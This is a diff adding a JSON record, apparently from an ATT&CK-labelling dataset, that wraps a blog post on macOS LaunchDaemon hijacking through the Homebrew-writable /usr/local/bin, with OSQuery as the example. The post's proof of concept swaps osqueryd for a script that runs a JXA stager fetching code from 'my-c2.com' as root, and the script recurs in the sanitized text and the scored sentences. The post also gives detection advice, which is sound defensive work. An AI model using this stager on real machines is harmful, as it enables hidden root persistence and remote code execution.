@@ -1,0 +1,133 @@
+{
+  "original_txt": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nI first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn’t a novel technique (it’s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.\nExample – Hijacking the OSQuery LaunchDaemon\nWhat is OSQuery?\nOSQuery is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL. On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.\nThe OSQuery installer creates a binary called /usr/local/bin/osqueryd\nand sets up a LaunchDaemon via /Library/LaunchDaemons/com.facebook.osqueryd.plist\n:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>KeepAlive</key>\n<true/>\n<key>Disabled</key>\n<false/>\n<key>Label</key>\n<string>com.facebook.osqueryd</string>\n<key>ProgramArguments</key>\n<array>\n<string>/usr/local/bin/osqueryd</string>\n<string>--flagfile=/private/var/osquery/osquery.flags</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n<key>ThrottleInterval</key>\n<integer>60</integer>\n</dict>\n</plist>\nWhich, at a high level, looks like this:\nOn a default MacOS install, this is perfectly safe:\n/Library/LaunchDaemons/com.facebook.osqueryd.plist\ncan’t be tampered with to run anything other than/usr/local/bin/osqueryd\n✅/usr/local/bin/osqueryd\ncan’t be modified to include malicious code ✅\nHow is this exploitable?\nWhile /usr/local/bin\nis a secure folder to store binaries on a default MacOS install, this isn’t the case on many real-world systems.\nMany people install a package manager called Homebrew which, during installation, makes the /usr/local/bin\nfolder writable by the current user (even if they’re not an admin).\nThis subtly changes the picture:\nNow, although a normal user can’t modify the /usr/local/bin/osqueryd\nfile directly, they can simply replace it!\nBecause /usr/local/bin\nis globally writeable, any user on the system has permission to:\n- Delete files in this folder—for example, the real\nosqueryd\nbinary. - Create files in this folder—for example, some malware named\nosqueryd\n.\nProof of concept\n# 1. Move the original osqueryd binary somewhere else\nmv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd\n# 2. Create our replacement osqueryd\ncat << EOF > /usr/local/bin/osqueryd\n#!/bin/bash\n# Firstly start the original osqueryd binary in the background\n# (so no one notices we've hijacked it)\n/usr/local/bin/.osquery/osqueryd &\n# Then run our malicious payload e.g. a JXA stager\n/usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\"\nEOF\n# 3. Reboot the machine. Our payload will be started as root on start-up\nosascript -e 'tell application \"System Events\" to restart'\nThis short script demonstrates a complete LaunchDaemon Hijack:\n- Firstly it moves the real\nosqueryd\nbinary to a hidden folder. - It then creates a payload in\n/usr/local/bin/osqueryd\nthat:- Starts the original\nosqueryd\nbinary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked). - Runs a backdoor.\n- Starts the original\n- Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won’t get code execution until the user restarts themselves.\nOnce exploited, the system looks like this:\nExploiting this in general\nOSQuery is not alone in being vulnerable to this technique.\nThe change in /usr/local/bin\npermissions during a Homebrew install is a particularly common cause of this issue.\nA secure (non-hijackable) LaunchDaemon needs to look like this:\nAll four of those padlocks needs to be correctly present to avoid being vulnerable. A non-root user mustn’t be able to:\n- Modify any file within\n/Library/LaunchDaemons\n- Create files within\n/Library/LaunchDaemons\n- Modify any binary referenced by\n/Library/LaunchDaemons/*.plist\n- Create binaries within a folder referenced by\n/Library/LaunchDaemons/*.plist\nDevelopers and admins are pretty good at getting points 1–3 right. It’s point 4 where problems are most likely to arise—folder permissions are just a bit more confusing than file permissions.\nWhat to do about LaunchDaemon Hijacking\nFor red teamers\nLaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS.\nBecause it doesn’t create or modify any of the *.plist\nfiles in /Library/LaunchDaemons\nor /Library/LaunchAgents\n,\nit’s not going to trigger any detection rules looking for changes in these folders.\nIf you’re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.\nOf course, this technique can also apply to a user’s personal LaunchAgents (configured in /Users/username/Library/LaunchAgents\n).\nThese are very likely run binaries that can be hijacked to achieve persistence\n(though you won’t gain any additional privileges this way).\nFor blue teamers\nProtective measures\nThankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.\nAll you need to look for is any /Library/LaunchDaemons/*.plist\nor /Library/LaunchAgents/*.plist\nfile where either:\n- The binary being launched is writeable by non-root users.\n- The binary being launched is in a directory writeable by non-root users.\nThe fix is simply to fix the file permissions or move the binary to a more secure location.\nHere is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go\n⚠️ Beware, this script doesn’t detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.\nDetective measures\nIf you can’t fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.\nBecause this technique requires replacing the LaunchDaemon binary, you’ll be able to detect it by regularly computing file checksums and comparing against known-good values.\nA pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself…",
+  "sanitized_txt": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nExample – Hijacking the OSQuery LaunchDaemon What is OSQuery?\nOSQuery is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL. On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.\nThe OSQuery installer creates a binary called /usr/local/bin/osqueryd and sets up a LaunchDaemon via /Library/LaunchDaemons/com.facebook.osqueryd.plist :\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> <key>KeepAlive</key> <true/> <key>Disabled</key> <false/> <key>Label</key> <string>com.facebook.osqueryd</string> <key>ProgramArguments</key> <array> <string>/usr/local/bin/osqueryd</string> <string>--flagfile=/private/var/osquery/osquery.flags</string> </array> <key>RunAtLoad</key> <true/> <key>ThrottleInterval</key> <integer>60</integer> </dict> </plist> Which, at a high level, looks like this:\nOn a default MacOS install, this is perfectly safe:\n/Library/LaunchDaemons/com.facebook.osqueryd.plist can’t be tampered with to run anything other than/usr/local/bin/osqueryd ✅/usr/local/bin/osqueryd can’t be modified to include malicious code ✅ How is this exploitable?\nWhile /usr/local/bin is a secure folder to store binaries on a default MacOS install, this isn’t the case on many real-world systems.\nMany people install a package manager called Homebrew which, during installation, makes the /usr/local/bin folder writable by the current user (even if they’re not an admin).\nThis subtly changes the picture:\nNow, although a normal user can’t modify the /usr/local/bin/osqueryd file directly, they can simply replace it!\nBecause /usr/local/bin is globally writeable, any user on the system has permission to:\n- Delete files in this folder—for example, the real osqueryd binary. - Create files in this folder—for example, some malware named osqueryd .\nProof of concept # 1. Move the original osqueryd binary somewhere else mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd # 2. Create our replacement osqueryd cat << EOF > /usr/local/bin/osqueryd #!/bin/bash # Firstly start the original osqueryd binary in the background # (so no one notices we've hijacked it) /usr/local/bin/.osquery/osqueryd & # Then run our malicious payload e.g. a JXA stager /usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\" EOF # 3. Reboot the machine. Our payload will be started as root on start-up osascript -e 'tell application \"System Events\" to restart' This short script demonstrates a complete LaunchDaemon Hijack:\n- Firstly it moves the real osqueryd binary to a hidden folder. - It then creates a payload in /usr/local/bin/osqueryd that:- Starts the original osqueryd binary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked). - Runs a backdoor.\n- Starts the original - Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won’t get code execution until the user restarts themselves.\nOnce exploited, the system looks like this:\nExploiting this in general OSQuery is not alone in being vulnerable to this technique.\nThe change in /usr/local/bin permissions during a Homebrew install is a particularly common cause of this issue.\nA secure (non-hijackable) LaunchDaemon needs to look like this:\nAll four of those padlocks needs to be correctly present to avoid being vulnerable. A non-root user mustn’t be able to:\n- Modify any file within /Library/LaunchDaemons - Create files within /Library/LaunchDaemons - Modify any binary referenced by /Library/LaunchDaemons/*.plist - Create binaries within a folder referenced by /Library/LaunchDaemons/*.plist Developers and admins are pretty good at getting points 1–3 right. It’s point 4 where problems are most likely to arise—folder permissions are just a bit more confusing than file permissions.\nWhat to do about LaunchDaemon Hijacking For red teamers LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS.\nBecause it doesn’t create or modify any of the *.plist files in /Library/LaunchDaemons or /Library/LaunchAgents , it’s not going to trigger any detection rules looking for changes in these folders.\nIf you’re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.\nOf course, this technique can also apply to a user’s personal LaunchAgents (configured in /Users/username/Library/LaunchAgents ).\nThese are very likely run binaries that can be hijacked to achieve persistence (though you won’t gain any additional privileges this way).\nFor blue teamers Protective measures Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.\nAll you need to look for is any /Library/LaunchDaemons/*.plist or /Library/LaunchAgents/*.plist file where either:\n- The binary being launched is writeable by non-root users.\n- The binary being launched is in a directory writeable by non-root users.\nThe fix is simply to fix the file permissions or move the binary to a more secure location.\nHere is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go ⚠️ Beware, this script doesn’t detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.\nDetective measures If you can’t fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.\nBecause this technique requires replacing the LaunchDaemon binary, you’ll be able to detect it by regularly computing file checksums and comparing against known-good values.\nA pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself…",
+  "ID_list": [
+    "T1543.004"
+  ],
+  "Name_list": [
+    "Execution",
+    "Persistence",
+    "Phishing",
+    "Privilege Escalation"
+  ],
+  "TTP_sentences": {
+    "T1543.004": [
+      {
+        "sentence": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique.",
+        "score": 0.5468
+      },
+      {
+        "sentence": "It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.",
+        "score": 0.5664
+      },
+      {
+        "sentence": "I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem.",
+        "score": 0.3206
+      },
+      {
+        "sentence": "Example – Hijacking the OSQuery LaunchDaemon What is OSQuery?",
+        "score": 0.3809
+      },
+      {
+        "sentence": "On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.",
+        "score": 0.5817
+      },
+      {
+        "sentence": "While /usr/local/bin is a secure folder to store binaries on a default MacOS install, this isn’t the case on many real-world systems.",
+        "score": 0.383
+      },
+      {
+        "sentence": "Many people install a package manager called Homebrew which, during installation, makes the /usr/local/bin folder writable by the current user (even if they’re not an admin).",
+        "score": 0.4547
+      },
+      {
+        "sentence": "Because /usr/local/bin is globally writeable, any user on the system has permission to: - Delete files in this folder—for example, the real osqueryd binary. - Create files in this folder—for example, some malware named osqueryd .",
+        "score": 0.3769
+      },
+      {
+        "sentence": "Move the original osqueryd binary somewhere else mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd # 2.",
+        "score": 0.3072
+      },
+      {
+        "sentence": "Create our replacement osqueryd cat << EOF > /usr/local/bin/osqueryd #!/bin/bash # Firstly start the original osqueryd binary in the background # (so no one notices we've hijacked it) /usr/local/bin/.osquery/osqueryd & # Then run our malicious payload e.g. a JXA stager /usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\" EOF # 3.",
+        "score": 0.5383
+      },
+      {
+        "sentence": "Reboot the machine.",
+        "score": 0.3146
+      },
+      {
+        "sentence": "This step is optional but otherwise we won’t get code execution until the user restarts themselves.",
+        "score": 0.3363
+      },
+      {
+        "sentence": "The change in /usr/local/bin permissions during a Homebrew install is a particularly common cause of this issue.",
+        "score": 0.3849
+      },
+      {
+        "sentence": "A secure (non-hijackable) LaunchDaemon needs to look like this: All four of those padlocks needs to be correctly present to avoid being vulnerable.",
+        "score": 0.5184
+      },
+      {
+        "sentence": "A non-root user mustn’t be able to: - Modify any file within /Library/LaunchDaemons - Create files within /Library/LaunchDaemons - Modify any binary referenced by /Library/LaunchDaemons/*.plist - Create binaries within a folder referenced by /Library/LaunchDaemons/*.plist Developers and admins are pretty good at getting points 1–3 right.",
+        "score": 0.6514
+      },
+      {
+        "sentence": "It’s point 4 where problems are most likely to arise—folder permissions are just a bit more confusing than file permissions.",
+        "score": 0.3223
+      },
+      {
+        "sentence": "What to do about LaunchDaemon Hijacking For red teamers LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS.",
+        "score": 0.5798
+      },
+      {
+        "sentence": "Because it doesn’t create or modify any of the *.plist files in /Library/LaunchDaemons or /Library/LaunchAgents , it’s not going to trigger any detection rules looking for changes in these folders.",
+        "score": 0.4938
+      },
+      {
+        "sentence": "If you’re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.",
+        "score": 0.3677
+      },
+      {
+        "sentence": "Of course, this technique can also apply to a user’s personal LaunchAgents (configured in /Users/username/Library/LaunchAgents ).",
+        "score": 0.6199
+      },
+      {
+        "sentence": "These are very likely run binaries that can be hijacked to achieve persistence (though you won’t gain any additional privileges this way).",
+        "score": 0.416
+      },
+      {
+        "sentence": "For blue teamers Protective measures Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.",
+        "score": 0.4461
+      },
+      {
+        "sentence": "All you need to look for is any /Library/LaunchDaemons/*.plist or /Library/LaunchAgents/*.plist file where either: - The binary being launched is writeable by non-root users. - The binary being launched is in a directory writeable by non-root users.",
+        "score": 0.6304
+      },
+      {
+        "sentence": "The fix is simply to fix the file permissions or move the binary to a more secure location.",
+        "score": 0.326
+      },
+      {
+        "sentence": "Here is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go ⚠️ Beware, this script doesn’t detect more nuanced cases.",
+        "score": 0.5367
+      },
+      {
+        "sentence": "For example, where a LaunchDaemon runs bash with a hijackable script as an argument.",
+        "score": 0.5253
+      },
+      {
+        "sentence": "Detective measures If you can’t fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.",
+        "score": 0.4493
+      },
+      {
+        "sentence": "Because this technique requires replacing the LaunchDaemon binary, you’ll be able to detect it by regularly computing file checksums and comparing against known-good values.",
+        "score": 0.4977
+      },
+      {
+        "sentence": "A pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself…",
+        "score": 0.4122
+      }
+    ]
+  }
+}
